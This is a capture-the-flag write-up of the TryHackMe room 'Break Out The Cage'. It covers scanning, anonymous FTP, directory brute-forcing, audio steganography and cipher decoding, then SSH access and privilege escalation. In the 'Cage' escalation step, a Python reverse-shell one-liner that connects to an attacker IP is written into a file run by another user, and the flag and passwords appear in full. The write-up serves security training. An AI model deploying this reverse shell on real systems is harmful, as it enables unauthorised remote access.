# TryHackMe-BreakOutTheCage


## NMAP

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-19 16:33 PKT
Nmap scan report for 10.10.4.108
Host is up (0.24s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25 23:33 dad_tasks
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.94.60
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
|   256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
|_  256 c0:a6:a3:64:44:1e:cf:47:5f:85:f6:1f:78:4c:59:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Nicholas Cage Stories
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.39 seconds

```

## FTP

```
ftp 10.10.4.108
Connected to 10.10.4.108.
220 (vsFTPd 3.0.3)
Name (10.10.4.108:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 25 23:32 .
drwxr-xr-x    2 0        0            4096 May 25 23:32 ..
-rw-r--r--    1 0        0             396 May 25 23:33 dad_tasks
226 Directory send OK.
ftp> 
```

We get some base64 encoded text in `dad_tasks` on decoding it 

```
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl

```

## Gobuster

```
gobuster dir -u http://10.10.4.108 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.4.108
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/19 16:46:39 Starting gobuster
===============================================================
/images (Status: 301)
/html (Status: 301)
/scripts (Status: 301)
/contracts (Status: 301)
/auditions (Status: 301)
Progress: 62135 / 220561 (28.17%)
===============================================================
2020/10/19 17:04:57 Finished
===============================================================

```


`wget http://10.10.4.108/auditions/must_practice_corrupt_file.mp3`


## Steganography

### Audacity
<img src="https://imgur.com/KtPjoZ1.png"/>


### Sonic Visualizer

<img src="https://imgur.com/teGZ6sc.png"/>

By selecting `spectrogram` we can view it which is `namelesstwo` now by using Vigenere cipher we can decode the text which is 


```
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes
```


`Mydadisghostrideraintthatcoolnocausehesonfirejokes` this may be a password for user `weston` because he set up the website

## SSH

```
weston@10.10.4.108's password:                                            
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)                                                                                 
                                                                          
 * Documentation:  https://help.ubuntu.com                                
 * Management:     https://landscape.canonical.com                        
 * Support:        https://ubuntu.com/advantage                           

  System information as of Mon Oct 19 12:28:23 UTC 2020                   

  System load:  0.0                Processes:           89                                                                                          
  Usage of /:   20.3% of 19.56GB   Users logged in:     0                 
  Memory usage: 32%                IP address for eth0: 10.10.4.108                                                                                 
  Swap usage:   0%                   


39 packages can be updated.          
0 updates are security updates.                                           


         __________                  
        /\____;;___\                 
       | /         /                 
       `. ())oo() .                  
        |\(%()*^^()^\                
       %| |-%-------|                
      % \ | %  ))   |                
      %  \|%________|                
       %%%%                          
Last login: Tue May 26 10:58:20 2020 from 192.168.247.1                   
weston@national-treasure:~$ ls -la

```

## Privilege Escalation (Cage)

We got a low privileged user shell (weston) in order to elevate to root we have to get `cage` shell for that visit `/opt` there you will find a python file and a hidden `.quotes` we can edit that file so delete the file create a new `vim .quotes` file copy and paste the below reverse shell with some text in first

```
"pwn" && python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.94.60",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```
and start listening for revere shell (netcat).


```
cage@national-treasure:~/email_backup$ cd ..
cage@national-treasure:~$ ls -la
total 56
drwx------ 7 cage cage 4096 May 26 21:34 .
drwxr-xr-x 4 root root 4096 May 26 07:49 ..
lrwxrwxrwx 1 cage cage    9 May 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 cage cage  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 cage cage 3771 Apr  4  2018 .bashrc
drwx------ 2 cage cage 4096 May 25 23:20 .cache
drwxrwxr-x 2 cage cage 4096 May 25 13:00 email_backup
drwx------ 3 cage cage 4096 May 25 23:20 .gnupg
drwxrwxr-x 3 cage cage 4096 May 25 23:40 .local
-rw-r--r-- 1 cage cage  807 Apr  4  2018 .profile
-rw-rw-r-- 1 cage cage   66 May 25 23:40 .selected_editor
drwx------ 2 cage cage 4096 May 26 07:33 .ssh
-rw-r--r-- 1 cage cage    0 May 25 23:20 .sudo_as_admin_successful
-rw-rw-r-- 1 cage cage  230 May 26 08:01 Super_Duper_Checklist
-rw------- 1 cage cage 6761 May 26 21:34 .viminfo
cage@national-treasure:~$ cat Super_Duper_Checklist 
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: THM{M37AL_0R_P3N_T35T1NG}
cage@national-treasure:~$ 



```
On visiting `/home/cage/email_backup/email_2`

We will again find a encoded text which is Vigenère 
`haiinspsyanileph`

Here we can see that focus is on `face` so that might be the key


## Privilege Escalation (Root)

`su root` with the password `cageisnotalegend`

Visit `/root/email_backup/email_2`

And you'll find the root flag.
